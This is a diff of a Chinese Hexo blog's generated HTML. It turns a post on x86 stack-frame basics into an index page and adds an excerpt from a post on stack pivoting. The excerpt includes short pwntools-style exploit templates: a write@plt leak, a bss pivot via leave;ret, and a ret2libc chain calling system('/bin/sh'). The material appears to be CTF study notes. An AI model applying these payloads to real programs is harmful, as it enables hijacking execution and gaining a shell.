@@ -20,35 +20,28 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用， eg： mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。 在x86处理器中：EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。 ESP(Stack Point">
-<meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出基础知识-1">
-<meta property="og:url" content="http://example.com/2024/10/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用， eg： mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。 在x86处理器中：EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。 ESP(Stack Point">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://images0.cnblogs.com/i/569008/201405/271652449633815.jpg">
-<meta property="og:image" content="https://ooo.0x0.ooo/2024/03/20/Og7vZt.jpg">
-<meta property="article:published_time" content="2024-10-08T07:02:08.000Z">
-<meta property="article:modified_time" content="2024-10-08T07:45:17.305Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images0.cnblogs.com/i/569008/201405/271652449633815.jpg">
 
-<link rel="canonical" href="http://example.com/2024/10/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/">
+<link rel="canonical" href="http://example.com/page/5/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>栈溢出基础知识-1 | Hexo</title>
+  <title>Hexo</title>
   
 
 
@@ -146,10 +139,105 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/08/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/10/08/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="post-title-link" itemprop="url">栈迁移</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-08 15:02:17" itemprop="dateCreated datePublished" datetime="2024-10-08T15:02:17+08:00">2024-10-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-10-21 21:59:41" itemprop="dateModified" datetime="2024-10-21T21:59:41+08:00">2024-10-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
 
     
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>每条指令的作用：</p>
+<ol>
+<li><p><code>push eip+4;</code></p>
+<ul>
+<li>这条指令将当前指令指针寄存器（<code>eip</code>）加上 4 的值压入栈中。这里的 <code>eip+4</code> 实际上是下一条指令的地址（假设没有其他的分支跳转或中断），因为 <code>eip</code> 指向当前正在执行的指令的地址。这样做通常是为了将返回地址（即函数调用指令的下一条指令地址）保存到栈中，以便函数调用完成后可以正确地返回。</li>
+</ul>
+</li>
+<li><p><code>push ebp;</code></p>
+<ul>
+<li>这条指令将当前基指针寄存器（<code>ebp</code>）的值压入栈中。<code>ebp</code> 通常用于指向当前栈帧的基址，因此将其值保存下来是为了在函数调用完成后能够恢复到调用函数之前的栈帧状态。</li>
+</ul>
+</li>
+<li><p><code>mov ebp, esp;</code></p>
+<ul>
+<li>这条指令将栈指针寄存器（<code>esp</code>）的值复制到基指针寄存器（<code>ebp</code>）。这意味着函数的栈帧基址现在被设置为当前栈顶的位置。之后，函数可以通过 <code>ebp</code> 寄存器访问其局部变量和参数。</li>
+</ul>
+</li>
+</ol>
+<p>这段代码的整体作用是设置一个新的栈帧，使得函数可以在其局部变量和参数上进行操作，同时保留调用函数前的栈帧状态，以便在函数返回时能够恢复原始状态。</p>
+<p>主要通过两次leave ret指令得到目的，最主要是要得到ebp值也就是栈底的地址，来更精确地进行两次leave，第一次的leave是输入后的自带leave，第二次的leave是我们自己导入的leave，做完之后就按着输入顺序一一调取按顺序进行。之后执行之前相当于一串函数，执行ret gift</p>
+<p>​																												main</p>
+<p>的操作，执行gitf时进行压栈，rsp下移到main，gift结束时执行main。</p>
+<p>32位模板：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p32(write_plt_addr) + p32(main_addr) + p32(<span class="number">1</span>) //<span class="comment">#此前为需要执行的命令</span></span><br><span class="line">     + p32(write_got_addr) + p32(<span class="number">4</span>)//<span class="comment">#此为必要的，一为返回的地址，二为</span></span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>64位模板（仅参考）：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=(p64(gift)+p64(main)).ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment"># 依次是需要执行的命令进行ret2libc</span></span><br><span class="line">payload+=p64(leak-<span class="number">0X8</span>)+p64(leave_ret)<span class="comment">#一为stack栈底地址，二位二次leave的命令地址 </span></span><br><span class="line">本题存在libc 所以每次ebp值不同</span><br><span class="line">payload1=(p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)).ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#p64执行获取shell步骤</span></span><br><span class="line">payload1+=p64(leak2-<span class="number">0x8</span>)+p64(leave_ret)<span class="comment">#一为stack栈底地址，二位二次leave的命令地址 之前依次是需要执行的命令进行getshell 若leak2的值不减去0x8 会导致第一个地址的命令无法执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\111Blog\myBlog\source_posts\栈迁移\8.png" alt="8"></p>
+<p>rbp&#x3D;gift 图误</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave=mov esp,ebp;  pop ebp;</span><br><span class="line">ret =pop eip <span class="comment">#弹出栈顶数据（rsp中的）给eip寄存器 rsp会上升8/4地址</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -165,9 +253,10 @@
       <meta itemprop="name" content="Hexo">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          栈溢出基础知识-1
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/10/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/" class="post-title-link" itemprop="url">栈溢出基础知识-1</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -191,7 +280,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="在汇编语言层面，"><a href="#在汇编语言层面，" class="headerlink" title="在汇编语言层面，"></a><strong>在汇编语言层面，</strong></h2><p><strong>这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，</strong></p>
+          <h2 id="在汇编语言层面，"><a href="#在汇编语言层面，" class="headerlink" title="在汇编语言层面，"></a><strong>在汇编语言层面，</strong></h2><p><strong>这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，</strong></p>
 <p><strong>eg： mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</strong></p>
 <h2 id="在x86处理器中："><a href="#在x86处理器中：" class="headerlink" title="在x86处理器中："></a><strong>在x86处理器中：</strong></h2><p><strong>EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。</strong></p>
 <p><strong>ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</strong></p>
@@ -247,31 +336,25 @@
 <p>   <strong>离开</strong>(leave)<strong>： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</strong></p>
 <p>   <strong>返回</strong>(ret)<strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</strong>*</p>
 
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2024/10/08/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="next" title="栈迁移">
-      栈迁移 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+  </nav>
 
 
 
@@ -323,7 +406,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%B1%82%E9%9D%A2%EF%BC%8C"><span class="nav-number">1.</span> <span class="nav-text">在汇编语言层面，</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8x86%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%AD%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">在x86处理器中：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">注意：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%8F%E4%B8%AA%E6%9C%AA%E5%AE%8C%E6%88%90%E8%BF%90%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E5%8D%A0%E7%94%A8%E4%B8%80%E4%B8%AA%E7%8B%AC%E7%AB%8B%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%8C%BA%E5%9F%9F%EF%BC%8C%E7%A7%B0%E4%BD%9C%E6%A0%88%E5%B8%A7-Stack-Frame-%E3%80%82"><span class="nav-number">3.1.</span> <span class="nav-text">每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%A0%88%E5%B8%A7%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A5%BD%E5%A4%84%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">使用栈帧的一个好处：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">函数调用时的具体步骤如下：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
